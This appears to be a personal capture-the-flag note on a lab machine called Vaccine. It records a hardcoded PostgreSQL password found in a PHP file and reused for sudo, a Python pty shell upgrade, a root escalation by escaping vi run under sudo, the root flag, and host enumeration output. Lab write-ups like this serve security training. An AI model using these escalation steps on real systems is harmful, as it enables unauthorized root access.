# Vaccine (10.10.10.46) Sh
#vaccine 
[[vaccine/apache]]

## Summary
### Users
| user     | pass      | host        | services         | groups            | soruce        |
| -------- | --------- | ----------- | ---------------- | ----------------- | ------------- |
| postgres | P@s5w0rd! | 10.10.10.46 | sudo, postgresql | postgres, ssl-crt | dashboard.php | 

### System Info
| System Attribute | Value                      |
| ---------------- | -------------------------- |
| OS Name          | Ubuntu 19.10 (Eoan Ermine) |
| OS Version       | kernel 5.3.0-29-generic    | 
| Archtechture     | x64                        |
| RAM              | 2GB                        |
| Nics             | ens160 (10.10.10.46)       |
## Procedure
1. Found db credentials for user `postgres` at /var/www/html/dashboard.php
	```
	$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
	```
	![[Pasted image 20210818150611.png]]
	- user: `postgres`
	- pass: `P@s5w0rd!`
2. Found sudo permissions for `postgres` user
	```
	$ python3 -c "import pty;pty.spawn('/bin/bash')"
	postgres@vaccine:/var/lib/postgresql/11/main$ sudo -l
	sudo -l
	[sudo] password for postgres: mc@F1l3ZilL4

	Sorry, try again.
	[sudo] password for postgres: P@s5w0rd!

	Matching Defaults entries for postgres on vaccine:
		env_reset, mail_badpass,
		secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User postgres may run the following commands on vaccine:
		(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
	```
	![[Pasted image 20210818152418.png]]
	- First command is used to get a shell with tty which allows sudo prompt to work
	- We have access to `/bin/vi` and a file called `/etc/postgresql/11/main/pg_hba.conf` with sudo
3. Escaped vi as sudo to become root
	```
	$ sudo vi /etc/postgresql/11/main/pg_hba.conf
	:!/bin/bash
	```
	![[Pasted image 20210818152615.png]]
4. Found root flag at /root/root.txt
	```
	root@vaccine:~# cat root.txt
	cat root.txt
	dd6e058e814260bc70e9bbdef2715849
	```
	![[Pasted image 20210818152821.png]]
	- Root flag: `dd6e058e814260bc70e9bbdef2715849`
5. Found lxc container config at /root/snap/lxd/12211/.config/lxc/config.yml
	```
	default-remote: local
	remotes:
	  images:
		addr: https://images.linuxcontainers.org
		protocol: simplestreams
		public: true
	  local:
		addr: unix://
		public: false
	aliases: {}
	```
	![[Pasted image 20210818153410.png]]
6. Got NIC information
	```
	$ ip addr show
	1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
		link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
		inet 127.0.0.1/8 scope host lo
		   valid_lft forever preferred_lft forever
		inet6 ::1/128 scope host
		   valid_lft forever preferred_lft forever
	2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
		link/ether 00:50:56:b9:7b:8f brd ff:ff:ff:ff:ff:ff
		inet 10.10.10.46/24 brd 10.10.10.255 scope global ens160
		   valid_lft forever preferred_lft forever
		inet6 dead:beef::250:56ff:feb9:7b8f/64 scope global dynamic mngtmpaddr
		   valid_lft 86198sec preferred_lft 14198sec
		inet6 fe80::250:56ff:feb9:7b8f/64 scope link
		   valid_lft forever preferred_lft forever
	```
	![[Pasted image 20210818160019.png]]
7. Got hardware info
	```
	$ lshw
	WARNING: you should run this program as super-user.
	vaccine
		description: Computer
		width: 64 bits
		capabilities: smp vsyscall32
	  *-core
		   description: Motherboard
		   physical id: 0
		 *-memory
			  description: System memory
			  physical id: 0
			  size: 2GiB
		 *-cpu:0
			  product: AMD EPYC 7401P 24-Core Processor
			  vendor: Advanced Micro Devices [AMD]
			  physical id: 1
			  bus info: cpu@0
			  width: 64 bits
	...
	```
	![[Pasted image 20210818160124.png]]
8. Got OS version
	```
	$ cat /etc/os-release
	NAME="Ubuntu"
	VERSION="19.10 (Eoan Ermine)"
	ID=ubuntu
	ID_LIKE=debian
	PRETTY_NAME="Ubuntu 19.10"
	VERSION_ID="19.10"
	HOME_URL="https://www.ubuntu.com/"
	SUPPORT_URL="https://help.ubuntu.com/"
	BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
	PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
	VERSION_CODENAME=eoan
	UBUNTU_CODENAME=eoan
	```
	![[Pasted image 20210818160218.png]]
9. Got Kernel info
	```
	$ uname -a
	Linux vaccine 5.3.0-29-generic #31-Ubuntu SMP Fri Jan 17 17:27:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
	```
	![[Pasted image 20210818160312.png]]